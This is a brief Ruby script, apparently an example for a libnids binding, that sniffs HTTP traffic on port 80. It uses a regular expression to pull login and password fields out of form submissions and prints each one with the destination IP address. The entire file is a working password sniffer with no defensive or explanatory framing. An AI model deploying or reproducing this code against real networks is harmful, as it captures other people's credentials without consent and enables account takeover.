$:.unshift("../")
require 'libnids'

def callback(opts = nil, ss = nil)
   return unless opts

   case opts["nids_state"]
      when NIDS::STATE_JUST_EST
         
      when NIDS::STATE_DATA
         data = opts["client_data"] + opts["server_data"]
         if data =~ /login[^=]*=([^&]*)&.*pass[^=]*=([^&]*)&/i
            puts "IP: #{opts['daddress']}"
            puts "User: #{$1}"
            puts "Pass: #{$2}"
         end
         
      when NIDS::STATE_CLOSE, NIDS::STATE_RESET
         
   end
end

conf = Hash.new
conf["pcap_filter"] = "port 80"
l = NIDS::Sniffer.new(conf)
l.register_tcp(self, :callback)
l.run

